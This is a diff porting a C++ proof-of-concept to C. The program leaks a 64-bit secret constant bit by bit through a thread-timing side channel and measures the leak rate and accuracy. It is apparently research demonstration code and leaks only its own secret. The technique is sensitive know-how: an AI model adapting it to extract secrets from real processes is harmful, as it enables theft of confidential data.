@@ -6,8 +6,6 @@
 #include <stdlib.h>  // exit()
 #include <math.h>
 #include <string.h>
-#include <vector>
-#include <atomic>
 
 static const uint64_t SECRET = 0xf07b23a5461d8c9e;
 
@@ -22,27 +20,94 @@ static unsigned x, y;
 //   just the x=bit*2+2 store, and the main thread cannot observe x==bit*2+1.
 // iters: a tuning parameter, how long we attempt to stall (in some arbitrary
 //   time unit) between the two stores to x
-template<unsigned bitnum>
-static void* threadfunc(void* iters) {
-  x = bitnum*2 + 1;
-  if(alwaysFalse) {
-    if(SECRET & (1ULL<<bitnum)) y = 1;
-  } else {
-    y = 1;
-  }
-
-  // waste some time, but don't use a syscall like usleep().
-  // If we use a syscall, gcc wants to do the x=1 store first, regardless
-  // Must be a do-while loop so gcc knows it executes at least once
-  // (otherwise gcc inserts an extra conditional branch, and suddenly thinks
-  // the x=1 store is necessary again)
-  uint64_t iterscount = (uint64_t)iters;
-  volatile int v = 0;
-  do { v++; } while(--iterscount > 0);
-
-  x = bitnum*2 + 2;
-  return (void*) (uintptr_t) y;  // keep gcc from removing the y=1 store entirely
+#define DECLARE_THREADFUNC(bitnum) \
+static void* threadfunc_##bitnum(void* iters) { \
+  x = bitnum*2 + 1; \
+  if(alwaysFalse) { \
+    if(SECRET & (1ULL<<bitnum)) y = 1; \
+  } else { \
+    y = 1; \
+  } \
+ \
+  /* waste some time, but don't use a syscall like usleep().                    */ \
+  /* If we use a syscall, gcc wants to do the x=bit*2+1 store first, regardless */ \
+  /* Must be a do-while loop so gcc knows it executes at least once             */ \
+  /* (otherwise gcc inserts an extra conditional branch, and suddenly thinks    */ \
+  /* the x=bit*2+1 store is necessary again)                                    */ \
+ \
+  uint64_t iterscount = (uint64_t)iters; \
+  volatile int v = 0; \
+  do { v++; } while(--iterscount > 0); \
+ \
+  x = bitnum*2 + 2; \
+  return (void*) (uintptr_t) y;  /* keep gcc from removing the y=1 store entirely */ \
 }
+
+// declare all threadfuncs
+DECLARE_THREADFUNC(0)
+DECLARE_THREADFUNC(1)
+DECLARE_THREADFUNC(2)
+DECLARE_THREADFUNC(3)
+DECLARE_THREADFUNC(4)
+DECLARE_THREADFUNC(5)
+DECLARE_THREADFUNC(6)
+DECLARE_THREADFUNC(7)
+DECLARE_THREADFUNC(8)
+DECLARE_THREADFUNC(9)
+DECLARE_THREADFUNC(10)
+DECLARE_THREADFUNC(11)
+DECLARE_THREADFUNC(12)
+DECLARE_THREADFUNC(13)
+DECLARE_THREADFUNC(14)
+DECLARE_THREADFUNC(15)
+DECLARE_THREADFUNC(16)
+DECLARE_THREADFUNC(17)
+DECLARE_THREADFUNC(18)
+DECLARE_THREADFUNC(19)
+DECLARE_THREADFUNC(20)
+DECLARE_THREADFUNC(21)
+DECLARE_THREADFUNC(22)
+DECLARE_THREADFUNC(23)
+DECLARE_THREADFUNC(24)
+DECLARE_THREADFUNC(25)
+DECLARE_THREADFUNC(26)
+DECLARE_THREADFUNC(27)
+DECLARE_THREADFUNC(28)
+DECLARE_THREADFUNC(29)
+DECLARE_THREADFUNC(30)
+DECLARE_THREADFUNC(31)
+DECLARE_THREADFUNC(32)
+DECLARE_THREADFUNC(33)
+DECLARE_THREADFUNC(34)
+DECLARE_THREADFUNC(35)
+DECLARE_THREADFUNC(36)
+DECLARE_THREADFUNC(37)
+DECLARE_THREADFUNC(38)
+DECLARE_THREADFUNC(39)
+DECLARE_THREADFUNC(40)
+DECLARE_THREADFUNC(41)
+DECLARE_THREADFUNC(42)
+DECLARE_THREADFUNC(43)
+DECLARE_THREADFUNC(44)
+DECLARE_THREADFUNC(45)
+DECLARE_THREADFUNC(46)
+DECLARE_THREADFUNC(47)
+DECLARE_THREADFUNC(48)
+DECLARE_THREADFUNC(49)
+DECLARE_THREADFUNC(50)
+DECLARE_THREADFUNC(51)
+DECLARE_THREADFUNC(52)
+DECLARE_THREADFUNC(53)
+DECLARE_THREADFUNC(54)
+DECLARE_THREADFUNC(55)
+DECLARE_THREADFUNC(56)
+DECLARE_THREADFUNC(57)
+DECLARE_THREADFUNC(58)
+DECLARE_THREADFUNC(59)
+DECLARE_THREADFUNC(60)
+DECLARE_THREADFUNC(61)
+DECLARE_THREADFUNC(62)
+DECLARE_THREADFUNC(63)
 
 // array storing pointers to all 64 threadfuncs
 void* (*threadfunc_array[64])(void*);
@@ -74,8 +139,7 @@ static bool leakSingleBit(unsigned bitnum, uint64_t iters) {
 // returns the guessed value of the 64-bit secret
 static uint64_t leak64bitSecret(uint64_t iters, unsigned error_runs) {
   unsigned run = 0;
-  std::vector<uint64_t> leakedSecrets;
-  leakedSecrets.reserve(error_runs);
+  uint64_t finalLeakedSecret = 0xffffffffffffffff;
 
   do {
     x = 0;
@@ -83,13 +147,11 @@ static uint64_t leak64bitSecret(uint64_t iters, unsigned error_runs) {
     for(unsigned bitnum = 0; bitnum < 64; bitnum++) {
       if(leakSingleBit(bitnum, iters)) leakedSecret |= 1ULL << bitnum;
     }
-    leakedSecrets.push_back(leakedSecret);
+    // if we ever observe 0 in any position, that means we observed x=bit*2+1,
+    // which means the bit is *most definitely* actually 0
+    finalLeakedSecret &= leakedSecret;
   } while(++run < error_runs);
 
-  // if we ever observe 0 in any position, that means we observed x=bit*2+1,
-  // which means the bit is *most definitely* actually 0
-  uint64_t finalLeakedSecret = 0xffffffffffffffff;
-  for(uint64_t secret : leakedSecrets) finalLeakedSecret &= secret;
   return finalLeakedSecret;
 }
 
@@ -116,7 +178,6 @@ struct manyRuns_res {
 void manyRuns(uint64_t iters, unsigned error_runs, uint64_t durationMS, struct manyRuns_res* res) {
   for(int i = 0; i < 65; i++) res->numOffBy[i] = 0;
   res->numRuns = 0;
-  std::vector<uint64_t> guessedSecrets;
   uint64_t start = getTime();
   uint64_t targetEnd = start + durationMS*1000000;
   while(getTime() < targetEnd) {
@@ -125,7 +186,6 @@ void manyRuns(uint64_t iters, unsigned error_runs, uint64_t durationMS, struct m
     for(int i = 0; i < 64; i++) if((SECRET & (1ULL << i)) ^ (guessedSecret & (1ULL << i))) bitsWrong++;
     res->numOffBy[bitsWrong]++;
     res->numRuns++;
-    guessedSecrets.push_back(guessedSecret);
   }
   uint64_t end = getTime();
   res->elapsedNanoseconds = end-start;
@@ -194,7 +254,7 @@ int main(int argc, char* argv[]) {
   }
 
   // initialize threadfunc array
-#define INITIALIZE_THREADFUNC(i) threadfunc_array[i] = threadfunc<i>
+#define INITIALIZE_THREADFUNC(i) threadfunc_array[i] = threadfunc_##i
   INITIALIZE_THREADFUNC(0);
   INITIALIZE_THREADFUNC(1);
   INITIALIZE_THREADFUNC(2);
@@ -271,15 +331,18 @@ int main(int argc, char* argv[]) {
 
     // column headings
     printf("       ");
-    for(unsigned error_runs : error_runs_vals) printf("      %-3u       ", error_runs);
+    // C++: for(const unsigned error_runs : error_runs_vals)
+    for(const unsigned* error_runs = &error_runs_vals[0]; error_runs < &error_runs_vals[9]; error_runs++)
+      printf("      %-3u       ", *error_runs);
     printf("\n\n");
 
     struct manyRuns_analysis analysis;
-    for(uint64_t iters : iters_vals) {
-      printf("%6llu ", iters);  // row heading
+    // C++: for(const uint64_t iters : iters_vals)
+    for(const uint64_t* iters = &iters_vals[0]; iters < &iters_vals[15]; iters++) {
+      printf("%6llu ", *iters);  // row heading
       fflush(stdout);
-      for(unsigned error_runs : error_runs_vals) {
-        manyRuns(iters, error_runs, 10000, &res);
+      for(const unsigned* error_runs = &error_runs_vals[0]; error_runs < &error_runs_vals[9]; error_runs++) {
+        manyRuns(*iters, *error_runs, 10000, &res);
         manyRuns_analyze(&res, &analysis);
         printf("%8.1f : %-5.1f", analysis.leakedBitsPerSec, 100*analysis.completelyCorrectRate);
         fflush(stdout);
